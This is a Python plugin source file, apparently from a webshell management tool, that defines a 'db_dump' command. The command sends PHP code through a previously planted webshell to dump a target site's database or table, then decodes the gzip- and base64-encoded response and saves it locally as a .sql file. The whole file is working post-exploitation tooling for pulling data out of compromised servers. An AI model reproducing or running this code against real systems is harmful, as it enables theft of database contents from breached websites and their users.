from os import path, makedirs
from base64 import b64decode

from libs.config import alias, color, gget
from libs.myapp import send, get_db_connect_code, gzinflate
from libs.functions.webshell_plugins.db_dump import *

@alias(True, _type="DATABASE", db="database", t="table", l="local_path")
def run(database: str = "", table: str = "", local_path: str = "", encoding: str = "utf8"):
    """
    db_dump

    Dump a database or a table to a file, Default file name is {database}.sql.

    eg: db_dump {database=current_database} {local_path=doughnuts/target/site.com/{database}.sql} {encoding="utf-8"}
    """
    if (not gget("db_connected", "webshell")):
        print(color.red("Please run db_init command first"))
        return
    database = database if database else gget("db_dbname", "webshell")
    download_path = local_path or gget("webshell.download_path", "webshell")
    if not path.exists(download_path):
        makedirs(download_path)
    file_name = f"{database}.sql" if (not table) else f"{database}.{table}.sql"
    connect_type = gget("db_connect_type", "webshell")
    res = send(get_php_db_dump(connect_type)%(database, database, encoding, database, get_db_connect_code(dbname=database), encoding, table))
    if (not res):
        return
    text = res.r_text.strip()
    content = res.r_content.strip()
    if (len(text) > 0 and res.status_code == 200):
        file_path = path.join(download_path, file_name).replace("\\", "/")
        with open(file_path, "wb") as f:
            f.write(gzinflate(b64decode(content)))
        print("\n" + color.green(f"Dump {database} to {file_name} success") + "\n")
    elif ("Error" in res.r_text):
        print("\n" + color.red(res.r_text.strip()) + "\n")
    else:
        print(color.red("\nError\n"))
